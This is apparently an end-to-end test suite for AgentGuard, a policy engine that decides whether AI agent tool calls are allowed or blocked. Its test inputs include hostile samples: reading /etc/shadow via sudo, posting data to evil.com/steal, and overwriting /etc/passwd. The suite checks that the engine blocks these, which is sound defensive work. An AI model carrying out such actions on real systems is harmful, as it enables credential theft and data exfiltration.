/**
 * AgentGuard API — End-to-End Tests
 *
 * Uses Node.js built-in test runner (node:test + node:assert).
 * Starts the API server programmatically, runs tests against localhost:3000,
 * then shuts down cleanly.
 *
 * Run: npx tsx --test tests/e2e.test.ts
 *
 * Requirements: No external test frameworks. Node.js ≥ 22.
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, type ChildProcess } from 'node:child_process';
import { setTimeout as sleep } from 'node:timers/promises';

// ─── Server lifecycle ─────────────────────────────────────────────────────────

const BASE = 'http://localhost:3001';
let serverProcess: ChildProcess | null = null;

// Unique email per test run to avoid duplicates across runs
const testEmail = `e2e-test-${Date.now()}@agentguard-test.local`;
const testEmail2 = `e2e-test2-${Date.now()}@agentguard-test.local`;
let apiKey = '';
let tenantId = '';

async function request(
  method: string,
  path: string,
  body?: unknown,
  headers: Record<string, string> = {},
): Promise<{ status: number; body: Record<string, unknown>; headers: Record<string, string> }> {
  const opts: RequestInit = {
    method,
    headers: {
      'Content-Type': 'application/json',
      ...headers,
    },
  };
  if (body !== undefined) {
    opts.body = JSON.stringify(body);
  }
  const res = await fetch(`${BASE}${path}`, opts);
  let responseBody: Record<string, unknown> = {};
  try {
    responseBody = await res.json() as Record<string, unknown>;
  } catch {
    // Non-JSON response
  }
  const responseHeaders: Record<string, string> = {};
  res.headers.forEach((v, k) => { responseHeaders[k] = v; });
  return { status: res.status, body: responseBody, headers: responseHeaders };
}

async function waitForServer(retries = 20, delayMs = 300): Promise<void> {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(`${BASE}/health`);
      if (res.ok) return;
    } catch {
      // Not ready yet
    }
    await sleep(delayMs);
  }
  throw new Error('Server did not start in time');
}

before(async () => {
  // Start server on port 3001 to avoid conflicts
  serverProcess = spawn(
    'npx', ['tsx', 'api/server.ts'],
    {
      cwd: process.cwd(),
      // AG_DB_PATH=:memory: ensures every test run starts with a clean DB — no state bleed between runs
      env: { ...process.env, PORT: '3001', NODE_ENV: 'test', ADMIN_KEY: 'e2e-admin-key-test', AG_DB_PATH: ':memory:' },
      stdio: ['ignore', 'pipe', 'pipe'],
    },
  );

  serverProcess.stderr?.on('data', (d: Buffer) => {
    // Suppress server logs during tests; uncomment to debug:
    // process.stderr.write(`[server] ${d}`);
  });

  await waitForServer();
});

after(async () => {
  if (serverProcess) {
    serverProcess.kill('SIGTERM');
    await sleep(200);
  }
});

// ─── API Health & Root ────────────────────────────────────────────────────────

describe('API Health & Root', () => {
  it('GET /health returns 200 with status ok (no sensitive data)', async () => {
    const res = await request('GET', '/health');
    assert.equal(res.status, 200);
    assert.equal(res.body['status'], 'ok');
    assert.equal(res.body['version'], '0.10.0');
    // Sensitive fields must NOT be present in public health endpoint
    assert.ok(!('engine' in res.body), 'engine should not be exposed');
    assert.ok(!('uptime' in res.body), 'uptime should not be exposed');
    assert.ok(!('db' in res.body), 'db type should not be exposed');
    assert.ok(!('tenants' in res.body), 'tenant count should not be exposed');
    assert.ok(!('activeAgents' in res.body), 'agent count should not be exposed');
  });

  it('GET / returns API directory', async () => {
    const res = await request('GET', '/');
    assert.equal(res.status, 200);
    assert.equal(res.body['name'], 'AgentGuard Policy Engine API');
    assert.ok(typeof res.body['version'] === 'string');
    assert.equal(res.body['status'], 'online');
    assert.ok(res.body['endpoints'] !== null && typeof res.body['endpoints'] === 'object');
  });

  it('GET / includes all major endpoints in directory', async () => {
    const res = await request('GET', '/');
    const endpoints = res.body['endpoints'] as Record<string, unknown>;
    assert.ok('POST /api/v1/signup' in endpoints);
    assert.ok('POST /api/v1/evaluate' in endpoints);
    assert.ok('GET  /api/v1/audit' in endpoints);
  });
});

// ─── Signup Flow ──────────────────────────────────────────────────────────────

describe('Signup Flow', () => {
  it('POST /api/v1/signup creates an account and returns API key', async () => {
    const res = await request('POST', '/api/v1/signup', {
      name: 'E2E Test Corp',
      email: testEmail,
    });
    assert.equal(res.status, 201);
    assert.ok(typeof res.body['tenantId'] === 'string');
    assert.ok(typeof res.body['apiKey'] === 'string');
    assert.ok((res.body['apiKey'] as string).startsWith('ag_live_'));
    assert.ok(typeof res.body['message'] === 'string');
    // Save for later tests
    apiKey = res.body['apiKey'] as string;
    tenantId = res.body['tenantId'] as string;
  });

  it('POST /api/v1/signup recovers duplicate email and returns a fresh key', async () => {
    const res = await request('POST', '/api/v1/signup', {
      name: 'Duplicate Corp',
      email: testEmail, // Same email as above
    });
    assert.equal(res.status, 200);
    assert.equal(res.body['recovered'], true);
    assert.equal(res.body['tenantId'], tenantId);
    assert.ok((res.body['apiKey'] as string).startsWith('ag_live_'));
    apiKey = res.body['apiKey'] as string;
  });

  it('POST /api/v1/signup rejects missing name with 400', async () => {
    const res = await request('POST', '/api/v1/signup', {
      email: `missing-name-${Date.now()}@test.local`,
    });
    assert.equal(res.status, 400);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('POST /api/v1/signup accepts missing email for instant onboarding', async () => {
    const res = await request('POST', '/api/v1/signup', { name: 'No Email Corp' });
    assert.equal(res.status, 201);
    assert.ok((res.body['apiKey'] as string).startsWith('ag_live_'));
  });

  it('POST /api/v1/signup rejects invalid email format with 400', async () => {
    const res = await request('POST', '/api/v1/signup', {
      name: 'Bad Email Corp',
      email: 'not-an-email',
    });
    assert.equal(res.status, 400);
    assert.match(res.body['error'] as string, /invalid email/i);
  });

  it('POST /api/v1/signup accepts second valid account', async () => {
    const res = await request('POST', '/api/v1/signup', {
      name: 'Second Corp',
      email: testEmail2,
    });
    assert.equal(res.status, 201);
    assert.ok((res.body['apiKey'] as string).startsWith('ag_live_'));
  });
});

// ─── Policy Evaluation ────────────────────────────────────────────────────────

describe('Policy Evaluation', () => {
  it('POST /api/v1/evaluate blocks privilege escalation (sudo)', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'sudo', params: { command: 'cat /etc/shadow' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
    assert.equal(res.body['matchedRuleId'], 'block-privilege-escalation');
    assert.ok(typeof res.body['riskScore'] === 'number');
    assert.ok(typeof res.body['durationMs'] === 'number');
  });

  it('POST /api/v1/evaluate blocks shell_exec', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'shell_exec' },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
  });

  it('POST /api/v1/evaluate blocks external HTTP requests', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'http_post', params: { destination: 'https://evil.com/steal', body: 'data' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
    assert.equal(res.body['matchedRuleId'], 'block-external-http');
  });

  it('POST /api/v1/evaluate allows safe read operations', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_read', params: { path: '/reports/q4.csv' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'allow');
    assert.equal(res.body['matchedRuleId'], 'allow-read-operations');
  });

  it('POST /api/v1/evaluate allows list_files', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'list_files', params: { directory: '/reports/' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'allow');
  });

  it('POST /api/v1/evaluate blocks PII table access', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'db_query', params: { table: 'users', query: 'SELECT *' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
    assert.equal(res.body['matchedRuleId'], 'block-pii-tables');
  });

  it('POST /api/v1/evaluate returns 401 without auth (auth required)', async () => {
    const res = await request('POST', '/api/v1/evaluate', { tool: 'file_read' });
    assert.equal(res.status, 401);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('POST /api/v1/evaluate works with valid API key (tenant mode)', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_read' },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'allow');
  });

  it('POST /api/v1/evaluate rejects missing tool with 400', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { params: { foo: 'bar' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 400);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('POST /api/v1/evaluate rejects non-string tool with 400', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 42 },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 400);
  });

  it('POST /api/v1/evaluate blocks destructive operations', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_delete' },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
    assert.equal(res.body['matchedRuleId'], 'block-destructive-ops');
  });

  it('POST /api/v1/evaluate requires_approval for high-value transactions', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'execute_transaction', params: { amount: 50000, recipient: 'vendor-123' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'require_approval');
  });

  it('POST /api/v1/evaluate blocks file_write to /etc/passwd', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_write', params: { path: '/etc/passwd', content: 'root:hacked' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
    assert.equal(res.body['matchedRuleId'], 'block-system-path-writes');
  });

  it('POST /api/v1/evaluate blocks write_file to /usr/bin/', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'write_file', params: { path: '/usr/bin/malware', content: '...' } },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
  });
});

// ─── Audit Trail ─────────────────────────────────────────────────────────────

describe('Audit Trail', () => {
  it('GET /api/v1/audit requires auth (returns 401 without key)', async () => {
    const res = await request('GET', '/api/v1/audit');
    assert.equal(res.status, 401);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('GET /api/v1/audit returns events for authenticated tenant', async () => {
    // First, generate some events for this tenant
    await request('POST', '/api/v1/evaluate', { tool: 'sudo' }, { 'X-API-Key': apiKey });
    await request('POST', '/api/v1/evaluate', { tool: 'file_read' }, { 'X-API-Key': apiKey });

    const res = await request('GET', '/api/v1/audit', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.equal(res.body['tenantId'], tenantId);
    assert.ok(typeof res.body['total'] === 'number');
    assert.ok(Array.isArray(res.body['events']));
    assert.ok((res.body['total'] as number) >= 2);
  });

  it('GET /api/v1/audit returns events with correct structure', async () => {
    const res = await request('GET', '/api/v1/audit', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    const events = res.body['events'] as Array<Record<string, unknown>>;
    assert.ok(events.length > 0);
    const event = events[0]!;
    assert.ok('tool' in event);
    assert.ok('result' in event);
    assert.ok('created_at' in event);
    assert.ok('hash' in event);
    assert.ok('previous_hash' in event);
  });

  it('GET /api/v1/audit/verify confirms hash chain is valid', async () => {
    const res = await request('GET', '/api/v1/audit/verify', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.equal(res.body['valid'], true);
    assert.ok(typeof res.body['eventCount'] === 'number');
    assert.match(res.body['message'] as string, /verified/i);
  });

  it('GET /api/v1/audit supports limit/offset pagination', async () => {
    const res = await request('GET', '/api/v1/audit?limit=1&offset=0', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.equal(res.body['limit'], 1);
    const events = res.body['events'] as unknown[];
    assert.ok(events.length <= 1);
  });
});

// ─── Kill Switch ─────────────────────────────────────────────────────────────

describe('Kill Switch', () => {
  it('GET /api/v1/killswitch returns status without auth', async () => {
    const res = await request('GET', '/api/v1/killswitch');
    assert.equal(res.status, 200);
    assert.ok('active' in res.body || 'global' in res.body);
  });

  it('POST /api/v1/killswitch requires auth (401 without key)', async () => {
    const res = await request('POST', '/api/v1/killswitch', { active: true });
    assert.equal(res.status, 401);
  });

  it('POST /api/v1/killswitch activates per-tenant kill switch', async () => {
    const res = await request('POST', '/api/v1/killswitch',
      { active: true },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['active'], true);
    assert.equal(res.body['tenantId'], tenantId);
  });

  it('POST /api/v1/evaluate returns block when tenant kill switch active', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_read' },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'block');
    assert.equal(res.body['matchedRuleId'], 'TENANT_KILL_SWITCH');
    assert.equal(res.body['killSwitchActive'], true);
  });

  it('Tenant kill switch does not affect other tenants (tenant isolation)', async () => {
    // A second tenant's key should not be blocked by the first tenant's kill switch
    const signupRes = await request('POST', '/api/v1/signup', {
      name: 'Kill Switch Isolation Corp',
      email: `ks-isolation-${Date.now()}@agentguard-test.local`,
    });
    const isolationApiKey = signupRes.body['apiKey'] as string;
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_read' },
      { 'X-API-Key': isolationApiKey },
    );
    assert.equal(res.status, 200);
    // Should evaluate normally — not hit the other tenant's kill switch
    assert.notEqual(res.body['matchedRuleId'], 'TENANT_KILL_SWITCH');
  });

  it('POST /api/v1/killswitch deactivates per-tenant kill switch', async () => {
    const res = await request('POST', '/api/v1/killswitch',
      { active: false },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['active'], false);
  });

  it('POST /api/v1/evaluate works normally after kill switch deactivated', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_read' },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['result'], 'allow');
  });

  it('POST /api/v1/admin/killswitch requires admin key', async () => {
    const res = await request('POST', '/api/v1/admin/killswitch',
      { active: false },
      { 'X-API-Key': 'wrong-key' },
    );
    assert.equal(res.status, 401);
  });

  it('POST /api/v1/admin/killswitch accepts correct admin key', async () => {
    // Ensure it's off first, then toggle back
    const res = await request('POST', '/api/v1/admin/killswitch',
      { active: false },
      { 'X-API-Key': 'e2e-admin-key-test' },
    );
    assert.equal(res.status, 200);
    assert.equal(res.body['active'], false);
  });
});

// ─── Usage Stats ─────────────────────────────────────────────────────────────

describe('Usage Stats', () => {
  it('GET /api/v1/usage requires auth (401 without key)', async () => {
    const res = await request('GET', '/api/v1/usage');
    assert.equal(res.status, 401);
  });

  it('GET /api/v1/usage returns stats for tenant', async () => {
    const res = await request('GET', '/api/v1/usage', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.equal(res.body['tenantId'], tenantId);
    assert.ok(typeof res.body['totalEvaluations'] === 'number');
    assert.ok(typeof res.body['blocked'] === 'number');
    assert.ok(typeof res.body['allowed'] === 'number');
    assert.ok(typeof res.body['last24h'] === 'number');
    assert.ok(Array.isArray(res.body['topBlockedTools']));
    assert.ok(typeof res.body['avgResponseMs'] === 'number');
  });

  it('GET /api/v1/usage counts are non-negative integers', async () => {
    const res = await request('GET', '/api/v1/usage', undefined, { 'X-API-Key': apiKey });
    assert.ok((res.body['totalEvaluations'] as number) >= 0);
    assert.ok((res.body['blocked'] as number) >= 0);
    assert.ok((res.body['allowed'] as number) >= 0);
  });
});

// ─── Input Validation ─────────────────────────────────────────────────────────

describe('Input Validation', () => {
  it('POST /api/v1/evaluate with bad JSON returns 400', async () => {
    const res = await fetch(`${BASE}/api/v1/evaluate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-API-Key': apiKey },
      body: '{ invalid json >>>',
    });
    // Express should return 400 for malformed JSON
    assert.ok([400, 415].includes(res.status), `expected 400 or 415, got ${res.status}`);
  });

  it('POST /api/v1/evaluate with empty body returns 400', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      {},
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 400);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('POST /api/v1/evaluate with missing tool field returns 400', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { params: {} },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 400);
  });

  it('POST /api/v1/evaluate with tool too long returns 400', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'a'.repeat(201) },
      { 'X-API-Key': apiKey },
    );
    assert.equal(res.status, 400);
    assert.equal(res.body['error'], 'validation_error');
    assert.equal(res.body['field'], 'tool');
    assert.match(res.body['expected'] as string, /200/i);
  });

  it('POST /api/v1/signup with empty string name returns 400', async () => {
    const res = await request('POST', '/api/v1/signup', {
      name: '',
      email: `empty-name-${Date.now()}@test.local`,
    });
    assert.equal(res.status, 400);
  });

  it('POST /api/v1/evaluate with oversized payload returns 413 (not 500)', async () => {
    // Generate a payload larger than the 50kb limit
    const bigPayload = JSON.stringify({
      tool: 'file_read',
      params: { data: 'x'.repeat(60 * 1024) }, // 60kb
    });
    const res = await fetch(`${BASE}/api/v1/evaluate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-API-Key': apiKey },
      body: bigPayload,
    });
    assert.equal(res.status, 413, `expected 413, got ${res.status}`);
  });
});

// ─── Security Headers ─────────────────────────────────────────────────────────

describe('Security Headers', () => {
  it('Response does not include X-Powered-By header', async () => {
    const res = await request('GET', '/health', undefined, { 'X-API-Key': apiKey });
    assert.ok(!('x-powered-by' in res.headers), 'X-Powered-By should not be present');
  });

  it('Response includes X-Frame-Options: SAMEORIGIN', async () => {
    const res = await request('GET', '/health', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.headers['x-frame-options'], 'SAMEORIGIN');
  });

  it('Response includes X-Content-Type-Options: nosniff', async () => {
    const res = await request('GET', '/health', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.headers['x-content-type-options'], 'nosniff');
  });

  it('Response includes Referrer-Policy', async () => {
    const res = await request('GET', '/health', undefined, { 'X-API-Key': apiKey });
    assert.ok(typeof res.headers['referrer-policy'] === 'string');
  });

  it('Rate limit headers present on /api/v1/evaluate', async () => {
    const res = await request('POST', '/api/v1/evaluate',
      { tool: 'file_read' },
      { 'X-API-Key': apiKey },
    );
    assert.ok(
      'x-ratelimit-limit' in res.headers || 'x-ratelimit-remaining' in res.headers,
      'should include rate limit headers',
    );
  });
});

// ─── CORS ─────────────────────────────────────────────────────────────────────

describe('CORS', () => {
  it('CORS blocks requests from disallowed origin (evil.com)', async () => {
    const res = await fetch(`${BASE}/health`, {
      headers: { Origin: 'https://evil.com', 'X-API-Key': apiKey },
    });
    // Either blocked (403) or CORS header not set for evil.com
    const corsHeader = res.headers.get('access-control-allow-origin');
    assert.ok(
      corsHeader !== 'https://evil.com',
      'evil.com should not be in CORS allowed origins',
    );
  });

  it('CORS allows requests from localhost', async () => {
    const res = await fetch(`${BASE}/health`, {
      headers: { Origin: 'http://localhost:3000', 'X-API-Key': apiKey },
    });
    const corsHeader = res.headers.get('access-control-allow-origin');
    // Localhost should be allowed (either explicitly or via wildcard)
    assert.ok(
      corsHeader === 'http://localhost:3000' || corsHeader === '*' || res.status === 200,
      'localhost should be allowed',
    );
  });

  it('OPTIONS preflight returns appropriate headers', async () => {
    const res = await fetch(`${BASE}/api/v1/evaluate`, {
      method: 'OPTIONS',
      headers: {
        Origin: 'http://localhost:3000',
        'X-API-Key': apiKey,
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type, X-API-Key',
      },
    });
    // Should return 2xx for preflight
    assert.ok(res.status < 300, `preflight should return 2xx, got ${res.status}`);
  });

  it('OPTIONS preflight allows dashboard PUT policy updates', async () => {
    const res = await fetch(`${BASE}/api/v1/policy`, {
      method: 'OPTIONS',
      headers: {
        Origin: 'https://app.agentguard.tech',
        'X-API-Key': apiKey,
        'Access-Control-Request-Method': 'PUT',
        'Access-Control-Request-Headers': 'Content-Type, X-API-Key',
      },
    });
    assert.ok(res.status < 300, `PUT preflight should return 2xx, got ${res.status}`);
    assert.equal(
      res.headers.get('access-control-allow-origin'),
      'https://app.agentguard.tech',
    );
  });
});

// ─── 404 Handling ─────────────────────────────────────────────────────────────

describe('404 Handling', () => {
  it('GET /nonexistent returns 404', async () => {
    const res = await request('GET', '/this-does-not-exist', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 404);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('GET /api/v1/fake returns 404 with hint', async () => {
    const res = await request('GET', '/api/v1/fake-endpoint', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 404);
    assert.ok('hint' in res.body || 'error' in res.body);
  });

  it('DELETE /api/v1/evaluate returns 404 (method not registered)', async () => {
    const res = await request('DELETE', '/api/v1/evaluate', undefined, { 'X-API-Key': apiKey });
    // Express will return 404 for unregistered method+path combinations
    assert.ok([404, 405].includes(res.status));
  });
});

// ─── Playground Flow ──────────────────────────────────────────────────────────

describe('Playground Flow', () => {
  let sessionId = '';

  it('Public playground creates a session and evaluates without signup', async () => {
    const res = await request('POST', '/api/v1/playground/session');
    assert.equal(res.status, 200);
    assert.ok(typeof res.body['sessionId'] === 'string');
    assert.ok(res.body['sessionId'] !== '');
    assert.ok(res.body['policy'] !== null && typeof res.body['policy'] === 'object');
    const publicSessionId = res.body['sessionId'] as string;

    const evalRes = await request('POST', '/api/v1/playground/evaluate', {
      sessionId: publicSessionId,
      tool: 'sudo',
      params: { command: 'whoami' },
    });
    assert.equal(evalRes.status, 200);
    assert.equal(evalRes.body['sessionId'], publicSessionId);
  });

  it('Authenticated playground session returns policy metadata', async () => {
    const res = await request('POST', '/api/v1/playground/session', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    sessionId = res.body['sessionId'] as string;
    const policy = res.body['policy'] as Record<string, unknown>;
    assert.ok(typeof policy['ruleCount'] === 'number');
    assert.ok((policy['ruleCount'] as number) > 0);
    assert.ok(Array.isArray(policy['rules']));
    assert.ok(['allow', 'block', 'monitor'].includes(policy['default'] as string));
  });

  it('POST /api/v1/playground/evaluate evaluates with session tracking', async () => {
    const res = await request('POST', '/api/v1/playground/evaluate', {
      sessionId,
      tool: 'sudo',
      params: { command: 'whoami' },
    }, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.equal(res.body['sessionId'], sessionId);
    assert.ok(res.body['decision'] !== null);
    const decision = res.body['decision'] as Record<string, unknown>;
    assert.equal(decision['result'], 'block');
    assert.ok(res.body['session'] !== null);
    const session = res.body['session'] as Record<string, unknown>;
    assert.ok(typeof session['actionCount'] === 'number');
    assert.ok(typeof session['auditTrailLength'] === 'number');
  });

  it('GET /api/v1/playground/audit/:sessionId returns session audit trail', async () => {
    // First add another event to the session
    await request('POST', '/api/v1/playground/evaluate', {
      sessionId,
      tool: 'file_read',
    }, { 'X-API-Key': apiKey });

    const res = await request('GET', `/api/v1/playground/audit/${sessionId}`, undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.equal(res.body['sessionId'], sessionId);
    assert.ok(Array.isArray(res.body['events']));
    assert.ok((res.body['eventCount'] as number) >= 1);
  });

  it('GET /api/v1/playground/audit/:sessionId returns events with hash chain', async () => {
    const res = await request('GET', `/api/v1/playground/audit/${sessionId}`, undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    const events = res.body['events'] as Array<Record<string, unknown>>;
    assert.ok(events.length > 0);
    const event = events[0]!;
    assert.ok('eventHash' in event);
    assert.ok('previousHash' in event);
    assert.ok('tool' in event);
    assert.ok('decision' in event);
    assert.ok('riskScore' in event);
  });

  it('GET /api/v1/playground/audit/:sessionId returns 404 for unknown session', async () => {
    const res = await request('GET', '/api/v1/playground/audit/nonexistent-session-xyz', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 404);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('GET /api/v1/playground/policy returns the active policy document', async () => {
    const res = await request('GET', '/api/v1/playground/policy', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.ok(res.body['policy'] !== null);
    const policy = res.body['policy'] as Record<string, unknown>;
    assert.ok(typeof policy['id'] === 'string');
    assert.ok(Array.isArray(policy['rules']));
    assert.ok((policy['rules'] as unknown[]).length > 0);
  });

  it('GET /api/v1/playground/scenarios returns preset scenarios', async () => {
    const res = await request('GET', '/api/v1/playground/scenarios', undefined, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body['scenarios']));
    const scenarios = res.body['scenarios'] as Array<Record<string, unknown>>;
    assert.ok(scenarios.length >= 3);
    // Each scenario has id, name, description, actions
    const scenario = scenarios[0]!;
    assert.ok(typeof scenario['id'] === 'string');
    assert.ok(typeof scenario['name'] === 'string');
    assert.ok(Array.isArray(scenario['actions']));
  });

  it('Playground evaluate rejects missing tool with 400', async () => {
    const res = await request('POST', '/api/v1/playground/evaluate', { sessionId }, { 'X-API-Key': apiKey });
    assert.equal(res.status, 400);
    assert.ok(typeof res.body['error'] === 'string');
  });

  it('Playground evaluate creates new session when sessionId is omitted', async () => {
    const res = await request('POST', '/api/v1/playground/evaluate', {
      tool: 'file_read',
    }, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    assert.ok(typeof res.body['sessionId'] === 'string');
    assert.ok(res.body['sessionId'] !== sessionId); // New session
  });

  it('Playground evaluate blocks chmod via privilege escalation rule', async () => {
    const res = await request('POST', '/api/v1/playground/evaluate', {
      sessionId,
      tool: 'chmod',
      params: { path: '/usr/bin/agent', mode: '777' },
    }, { 'X-API-Key': apiKey });
    assert.equal(res.status, 200);
    const decision = res.body['decision'] as Record<string, unknown>;
    assert.equal(decision['result'], 'block');
  });

  it('Playground audit trail length increments with each action', async () => {
    const newSession = await request('POST', '/api/v1/playground/session', undefined, { 'X-API-Key': apiKey });
    const sid = newSession.body['sessionId'] as string;

    await request('POST', '/api/v1/playground/evaluate', { sessionId: sid, tool: 'sudo' }, { 'X-API-Key': apiKey });
    await request('POST', '/api/v1/playground/evaluate', { sessionId: sid, tool: 'file_read' }, { 'X-API-Key': apiKey });
    await request('POST', '/api/v1/playground/evaluate', { sessionId: sid, tool: 'rm' }, { 'X-API-Key': apiKey });

    const audit = await request('GET', `/api/v1/playground/audit/${sid}`, undefined, { 'X-API-Key': apiKey });
    assert.equal(audit.body['eventCount'], 3);
  });
});
